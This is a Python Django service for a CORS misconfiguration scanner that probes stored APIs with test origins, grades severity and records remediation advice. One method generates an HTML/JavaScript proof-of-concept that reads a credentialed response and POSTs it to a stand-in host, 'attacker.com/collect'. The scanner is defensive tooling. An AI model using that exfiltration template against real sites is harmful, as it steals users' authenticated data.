import requests
import json
import time
from typing import Dict, List, Tuple, Optional
from django.utils import timezone
from django.db import transaction
from .models import CORSScanResultTC1, CORSScanSessionTC1


class CORSScannerServiceTC1:
    def __init__(self):
        self.timeout = 10
        self.test_origins = [
            'https://evil.example',
            'https://malicious.com',
            'http://127.0.0.1:8080',
            'null'
        ]

    def start_scan(self, scan_id: int, access_token: str) -> Dict:
        """Start CORS vulnerability scan for given scan_id"""
        try:
            # Get APIs from api_orch_postmanapi table
            apis = self._get_apis_for_scan(scan_id)
            if not apis:
                return {'error': 'No APIs found for scan_id'}

            # Create scan session
            session = CORSScanSessionTC1.objects.create(
                scan_id=scan_id,
                status='running',
                total_apis=len(apis),
                started_at=timezone.now()
            )

            # Start scanning
            self._perform_scan(session, apis, access_token)
            
            return {'message': f'CORS scan started for {len(apis)} APIs', 'session_id': session.id}

        except Exception as e:
            return {'error': str(e)}

    def _get_apis_for_scan(self, scan_id: int) -> List[Dict]:
        """Fetch APIs from api_orch_postmanapi table"""
        from django.db import connections
        
        try:
            connection = connections['default']
            cursor = connection.cursor()
            
            cursor.execute("""
                SELECT "id", "name", "method", "url", "headers", "body", "authorization", "query_params"
                FROM api_orch_postmanapi 
                WHERE "scan_id" = %s
            """, [scan_id])
            
            columns = [col[0] for col in cursor.description]
            apis = [dict(zip(columns, row)) for row in cursor.fetchall()]
            return apis
            
        except Exception as e:
            print(f"Error fetching APIs: {e}")
            return []

    def _perform_scan(self, session: CORSScanSessionTC1, apis: List[Dict], access_token: str):
        """Perform CORS scan on all APIs"""
        try:
            for api in apis:
                try:
                    result = self._test_cors_vulnerability(api, access_token)
                    self._save_scan_result(session.scan_id, api, result)
                    
                    # Update session progress
                    session.scanned_apis += 1
                    if result.get('status') == 'vulnerable':
                        session.vulnerable_apis += 1
                        severity = result.get('severity', 'info')
                        setattr(session, f"{severity}_count", getattr(session, f"{severity}_count") + 1)
                    
                    session.save()
                    
                except Exception as e:
                    # Save error result
                    error_result = {
                        'status': 'error',
                        'error_message': str(e),
                        'vulnerability_description': f'Error during scan: {str(e)}'
                    }
                    self._save_scan_result(session.scan_id, api, error_result)
                    session.scanned_apis += 1
                    session.save()

            # Mark scan as completed
            session.status = 'completed'
            session.completed_at = timezone.now()
            session.save()

        except Exception as e:
            session.status = 'failed'
            session.error_message = str(e)
            session.completed_at = timezone.now()
            session.save()

    def _test_cors_vulnerability(self, api: Dict, access_token: str) -> Dict:
        """Test CORS vulnerability for a single API"""
        start_time = time.time()
        result = {
            'status': 'not_vulnerable',
            'severity': None,
            'vulnerability_description': '',
            'exploit_poc': '',
            'remediation': '',
            'raw_response_headers': {},
            'response_time_ms': 0
        }

        try:
            url = api['url']
            method = api.get('method', 'GET').upper()
            headers = json.loads(api.get('headers', '{}')) if api.get('headers') else {}
            
            # Add authorization if access_token provided
            if access_token:
                headers['Authorization'] = f'Bearer {access_token}'

            # Test each malicious origin
            for origin in self.test_origins:
                cors_result = self._test_origin(url, method, origin, headers)
                
                if cors_result.get('vulnerable'):
                    result.update(cors_result)
                    result['status'] = 'vulnerable'
                    result['origin_tested'] = origin
                    break

            result['response_time_ms'] = (time.time() - start_time) * 1000

        except requests.exceptions.Timeout:
            result['status'] = 'timeout'
            result['error_message'] = 'Request timed out'
        except Exception as e:
            result['status'] = 'error'
            result['error_message'] = str(e)

        return result

    def _test_origin(self, url: str, method: str, origin: str, headers: Dict) -> Dict:
        """Test CORS with specific origin"""
        result = {'vulnerable': False}
        
        try:
            # Test preflight request
            preflight_headers = {
                'Origin': origin,
                'Access-Control-Request-Method': method,
                'Access-Control-Request-Headers': 'content-type,authorization'
            }
            
            preflight_response = requests.options(
                url, 
                headers=preflight_headers, 
                timeout=self.timeout,
                allow_redirects=False
            )
            
            result['preflight_response_status'] = preflight_response.status_code
            result['raw_response_headers'] = dict(preflight_response.headers)
            
            # Check CORS headers
            allow_origin = preflight_response.headers.get('Access-Control-Allow-Origin', '')
            allow_credentials = preflight_response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            allow_headers = preflight_response.headers.get('Access-Control-Allow-Headers', '')
            allow_methods = preflight_response.headers.get('Access-Control-Allow-Methods', '')
            
            result.update({
                'access_control_allow_origin': allow_origin,
                'access_control_allow_credentials': allow_credentials,
                'access_control_allow_headers': allow_headers,
                'access_control_allow_methods': allow_methods,
                'access_control_max_age': preflight_response.headers.get('Access-Control-Max-Age', '')
            })
            
            # Vulnerability assessment
            if self._is_cors_vulnerable(allow_origin, allow_credentials, origin):
                result['vulnerable'] = True
                result['severity'] = self._get_vulnerability_severity(allow_origin, allow_credentials)
                result['vulnerability_description'] = self._generate_vulnerability_description(
                    allow_origin, allow_credentials, origin
                )
                result['exploit_poc'] = self._generate_exploit_poc(url, origin)
                result['remediation'] = self._generate_remediation()

            # Test actual request if preflight allows
            if preflight_response.status_code == 200:
                actual_headers = headers.copy()
                actual_headers['Origin'] = origin
                
                actual_response = requests.request(
                    method, url, 
                    headers=actual_headers, 
                    timeout=self.timeout,
                    allow_redirects=False
                )
                result['actual_request_status'] = actual_response.status_code

        except Exception as e:
            result['error_message'] = str(e)
            
        return result

    def _is_cors_vulnerable(self, allow_origin: str, allow_credentials: bool, test_origin: str) -> bool:
        """Determine if CORS configuration is vulnerable"""
        # Critical: Wildcard with credentials
        if allow_origin == '*' and allow_credentials:
            return True
            
        # High: Reflects arbitrary origin
        if allow_origin == test_origin:
            return True
            
        # Medium: Wildcard without credentials (less severe)
        if allow_origin == '*':
            return True
            
        # Check for common misconfigurations
        if allow_origin and ('null' in allow_origin or test_origin in allow_origin):
            return True
            
        return False

    def _get_vulnerability_severity(self, allow_origin: str, allow_credentials: bool) -> str:
        """Determine vulnerability severity"""
        if allow_origin == '*' and allow_credentials:
            return 'critical'
        elif allow_credentials and allow_origin:
            return 'high'
        elif allow_origin == '*':
            return 'medium'
        else:
            return 'low'

    def _generate_vulnerability_description(self, allow_origin: str, allow_credentials: bool, origin: str) -> str:
        """Generate vulnerability description"""
        if allow_origin == '*' and allow_credentials:
            return "CRITICAL: Server allows any origin with credentials. This allows any website to make authenticated requests on behalf of users."
        elif allow_origin == origin:
            return f"HIGH: Server reflects the Origin header ({origin}) allowing arbitrary origins to make requests."
        elif allow_origin == '*':
            return "MEDIUM: Server allows any origin but doesn't allow credentials. Still allows data exfiltration."
        else:
            return f"Server allows origin: {allow_origin}"

    def _generate_exploit_poc(self, url: str, origin: str) -> str:
        """Generate proof of concept exploit"""
        return f"""
<!-- CORS Exploit PoC -->
<html>
<body>
<script>
fetch('{url}', {{
    method: 'GET',
    credentials: 'include',
    headers: {{
        'Origin': '{origin}'
    }}
}}).then(response => response.text())
  .then(data => {{
    console.log('Stolen data:', data);
    // Send to attacker server
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: data
    }});
  }});
</script>
</body>
</html>
"""

    def _generate_remediation(self) -> str:
        """Generate remediation advice"""
        return """
1. Implement a strict allowlist of trusted origins
2. Avoid using 'Access-Control-Allow-Origin: *' with credentials
3. Never reflect the Origin header directly without validation
4. Use HTTPS for all cross-origin requests
5. Implement proper CSRF protection
6. Review and audit CORS policies regularly
"""

    def _save_scan_result(self, scan_id: int, api: Dict, result: Dict):
        """Save scan result to database"""
        CORSScanResultTC1.objects.create(
            scan_id=scan_id,
            api_id=api['id'],
            api_name=api.get('name', 'Unknown'),
            api_url=api['url'],
            api_method=api.get('method', 'GET'),
            status=result.get('status', 'error'),
            severity=result.get('severity'),
            access_control_allow_origin=result.get('access_control_allow_origin', ''),
            access_control_allow_credentials=result.get('access_control_allow_credentials'),
            access_control_allow_headers=result.get('access_control_allow_headers', ''),
            access_control_allow_methods=result.get('access_control_allow_methods', ''),
            access_control_max_age=result.get('access_control_max_age', ''),
            origin_tested=result.get('origin_tested', ''),
            preflight_response_status=result.get('preflight_response_status'),
            actual_request_status=result.get('actual_request_status'),
            vulnerability_description=result.get('vulnerability_description', ''),
            exploit_poc=result.get('exploit_poc', ''),
            remediation=result.get('remediation', ''),
            response_time_ms=result.get('response_time_ms'),
            error_message=result.get('error_message', ''),
            raw_response_headers=result.get('raw_response_headers', {})
        )